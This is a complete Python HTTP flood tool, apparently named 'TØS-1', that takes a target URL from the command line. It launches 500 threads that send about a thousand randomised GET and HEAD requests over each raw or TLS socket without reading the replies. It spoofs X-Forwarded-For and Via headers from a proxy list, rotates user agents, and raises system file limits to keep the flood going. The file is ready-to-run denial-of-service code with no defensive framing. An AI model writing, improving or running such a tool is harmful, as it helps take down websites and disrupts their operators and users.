import socket
import ssl
import threading
import random
import time
import sys
import os

class TOS1_RAW:
    def __init__(self, target_url):
        self.target = target_url.replace("https://", "").replace("http://", "").split("/")[0]
        self.host = self.target.split(":")[0]
        self.port = 443 if "https" in target_url else 80
        self.session_id = "S023"
        self.total_requests = 0
        self.running = True
        
        # Load resources
        self.proxies = self.load_file("main.txt")
        self.user_agents = self.load_file("uas.txt") or self.load_file("ua.txt")
        
        # Stats
        self.requests_per_second = 0
        self.last_count = 0
        self.last_time = time.time()
        
        # Thread control
        self.thread_count = 500  # 500 THREADS
        self.threads = []
        
        # Headers
        self.headers = [
            "GET / HTTP/1.1\r\n",
            "HEAD / HTTP/1.1\r\n",
            "GET /?{} HTTP/1.1\r\n"
        ]
        
    def load_file(self, filename):
        try:
            with open(filename, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except:
            return []
    
    def build_request(self):
        """Build raw HTTP request"""
        proxy = random.choice(self.proxies) if self.proxies else None
        ua = random.choice(self.user_agents) if self.user_agents else "Mozilla/5.0"
        
        template = random.choice(self.headers)
        if "{}" in template:
            template = template.format(random.randint(10000, 99999))
        
        request = template
        request += f"Host: {self.host}\r\n"
        request += f"User-Agent: {ua}\r\n"
        request += "Accept: */*\r\n"
        request += "Accept-Language: en-US,en;q=0.9\r\n"
        request += "Accept-Encoding: gzip, deflate\r\n"
        request += "Connection: keep-alive\r\n"
        request += "Cache-Control: no-cache\r\n"
        
        if proxy:
            request += f"X-Forwarded-For: {proxy.split(':')[0] if ':' in proxy else proxy}\r\n"
            request += f"Via: 1.1 {proxy}\r\n"
        
        request += "\r\n"
        return request.encode()
    
    def create_socket(self):
        """Create raw socket connection"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        
        if self.port == 443:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            sock = context.wrap_socket(sock, server_hostname=self.host)
        
        try:
            sock.connect((self.host, self.port))
            return sock
        except:
            return None
    
    def attack_thread(self, thread_id):
        """Single attack thread - MAX RPS"""
        while self.running:
            sock = self.create_socket()
            if not sock:
                time.sleep(0.001)
                continue
            
            try:
                # Send MAX REQUESTS on single connection
                for _ in range(1000):  # 1000 reqs per connection
                    request = self.build_request()
                    sock.sendall(request)
                    self.total_requests += 1
                    
                    # Don't wait for response
                    try:
                        sock.settimeout(0.001)
                        sock.recv(1)  # Just peek
                    except:
                        pass
                    
            except:
                pass
            finally:
                try:
                    sock.close()
                except:
                    pass
            
            # Tiny delay between connections
            time.sleep(0.001)
    
    def update_display(self):
        """Update display every 100ms"""
        while self.running:
            time.sleep(0.1)
            current = self.total_requests
            now = time.time()
            
            elapsed = now - self.last_time
            if elapsed >= 1.0:
                self.requests_per_second = (current - self.last_count) / elapsed
                self.last_count = current
                self.last_time = now
            
            sys.stdout.write(f"\rTØS-1 — {self.total_requests} | {{S023}}")
            sys.stdout.flush()
    
    def maintenance(self):
        """Maintenance every 15 minutes"""
        while self.running:
            time.sleep(900)  # 15 minutes
            # Just reload files
            self.proxies = self.load_file("main.txt")
            self.user_agents = self.load_file("uas.txt") or self.load_file("ua.txt")
    
    def start(self):
        """Start the attack"""
        print("𝖳Ø𝖲-1 | 𝖲023")
        time.sleep(2)
        os.system('clear')
        
        # Start display thread
        display_thread = threading.Thread(target=self.update_display, daemon=True)
        display_thread.start()
        
        # Start maintenance thread
        maint_thread = threading.Thread(target=self.maintenance, daemon=True)
        maint_thread.start()
        
        # Start attack threads
        print(f"[+] Starting {self.thread_count} threads...")
        for i in range(self.thread_count):
            thread = threading.Thread(target=self.attack_thread, args=(i,), daemon=True)
            thread.start()
            self.threads.append(thread)
        
        # Keep running
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False
            time.sleep(1)
            sys.exit(0)

# Main
if __name__ == "__main__":
    if len(sys.argv) < 2:
        sys.exit(1)
    
    target = sys.argv[1]
    
    # Create files if not exist
    if not os.path.exists("main.txt"):
        open("main.txt", "w").close()
    
    if not os.path.exists("uas.txt") and not os.path.exists("ua.txt"):
        with open("uas.txt", "w") as f:
            f.write("Mozilla/5.0\n")
    
    # Increase system limits
    try:
        import resource
        resource.setrlimit(resource.RLIMIT_NOFILE, (100000, 100000))
    except:
        pass
    
    # Start
    attack = TOS1_RAW(target)
    attack.start()
